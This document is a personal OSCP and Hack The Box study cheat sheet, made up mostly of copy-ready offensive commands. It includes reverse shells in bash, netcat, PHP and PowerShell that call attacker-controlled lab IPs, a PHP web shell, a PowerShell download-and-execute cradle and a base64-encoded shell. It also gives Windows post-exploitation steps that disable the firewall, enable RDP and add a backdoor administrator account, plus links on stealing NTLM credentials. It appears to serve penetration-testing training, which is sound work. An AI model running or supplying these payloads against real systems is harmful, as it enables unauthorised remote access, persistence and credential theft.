Study Notes 📝
OSCP 2024

HTB OpenVPN NMCLI config to allow internet:
https://www.reddit.com/r/hackthebox/comments/13m1tb8/strange_error_with_connecting_vpn/#:~:text=Problem%20is%2C%20when%20you%20do,%2C%20StartingPoint%2C%20Academy%2C%20etc.



## **Quick TOOLS**
#tools


**Shell Upgrade**

`script /dev/null -c bash`


Increase shell functionality after initial foothold
```
#In Victim Terminal
export TERM=xterm
export SHELL=/bin/bash

python -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z (This will background the process)

#In kalki terminal
#This enables tab completion, better copy/paste, and arrow functionality
stty raw -echo; fg
```
![[Pasted image 20240724143853.png]]
![[Pasted image 20240724144126.png]]




**BASH Shell**
[[1. BUSQUEDA]]
`echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.12 9001 >/tmp/f" > /tmp/full-checkup.sh`


**FIND**
SUID
`find / -perm -u=s -type f 2>/dev/null`

```
find / \( -iname "user.txt" -o -iname "root.txt" \) -print -exec cat {} + 2>/dev/null
```
***

**PHP Rev Shells**

PHP 
```
<?php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.71/5555 0>&1'");
?>
```


PHP web shell which uses the system() function and a cmd URL parameter to execute system commands

```
<?php echo system($_REQUEST['cmd']);?>`
```
SEE `blob:https://app.hackthebox.com/f8d7de5c-517e-4de0-a609-0a46cb7380a8` for specifics in using with Burp and converting GET to POST Request


https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
***

**Python**
==`python -c 'import pty; pty.spawn("/bin/bash")'`==
==`python3 -m http.server`==




***

**NC** 
Reverse Shell
==`nc <Target_IP_Listener> <Target_Port> -e /bin/bash`==

- If `-e` switch is not an option:
https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/

`bash &>/dev/tcp/DEST_IP/DEST_PORT <&1`
`bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"`


Windows NC
==`wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe`==

```
nc -e cmd.exe [attacker_IP] [attackeer_port]
```

Windows Hacking Pack 
https://github.com/51x/WHP



***
**NISHANG**
```
/usr/share/nishang/Shells/
```

POWERSHELL
```
echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1') | powershell -noprofile -
```

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.19",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

***

**Base64 Encoded Shell**
[[1. STARTING POINT#UNIFIED]]
==`echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64`==






**EVIL-WINRM**

Usage:[[1. STARTING POINT#Evil-WinRM]]
- Default on Kali
- WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

- This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase.
- https://github.com/Hackplayers/evil-winrm




**REPSONDER**

Usage:[[1. STARTING POINT#**RESPONDER**]]
- Used to exploit NTLMv2 authentication protocol with malicious SMB server via RFI against a Windows web-server hosting XAMPP

![[Screenshot 2024-05-10 at 9.36.08 PM.png]]




**GOBUSTER**
Usage:[[1. STARTING POINT#**Gobuster**]]

- Web SUB/Directory enumeration

==`gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain




**AWS CLI**
Usage:[[1. STARTING POINT#**Install awscli**]]

- Interact with S3 buckets discovered in subdomain enumeration




**RsaCtfTool**
https://github.com/RsaCtfTool/RsaCtfTool
```
usage: RsaCtfTool.py [-h] [--publickey PUBLICKEY] [--output OUTPUT] [--timeout TIMEOUT] [--createpub] [--dumpkey] [--ext] [--decryptfile DECRYPTFILE] [--decrypt DECRYPT]...
```







***
***

## **WORDLISTS**

Windows File Inclusion - Common files
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt




***
***

## STEAL NTLM 

https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds

https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/


***
***

**WEB Information Disclosure && Enumeration**

WhatWeb
`whatweb http://[target_url]`

DirSearch
```
dirsearch -u https://[target] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 --random-agent -o [output_file] --format=simple
```


**VHOST**
```
sudo dig @10.10.10.29 bank.htb axfr
```


**Feroxbuster**
```
 cat /tmp/bank.txt | sudo feroxbuster --auto-tune --extract-links --random-agent --stdin --output /tmp/bank.ferox --threads 100 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

**WPSCAN**
```
sudo wpscan --url http://tenten.htb --random-user-agent --max-threads 10 --enumerate
```
***
**DNS**

**AQUATONE**
Tool for Domain Flyovers

Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
https://github.com/michenriksen/aquatone

***
**WINDOWS**

`smbserver.py`
```
sudo smbserver.py a /usr/share/windows-binaries/
```



`rlwrap` - for stable shell 
```
rlwrap nc -lvnp [port]
```


**Enable RDP**
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```


**Disable Firewall**
```
netsh advfirewall set allprofiles state off
```

**ADD ACCOUNT**
```
net user carlos hack3d#! /add
```


**ADD USER TO ADMIN GROUP**
```
net localgroup administrators carlos /add
```


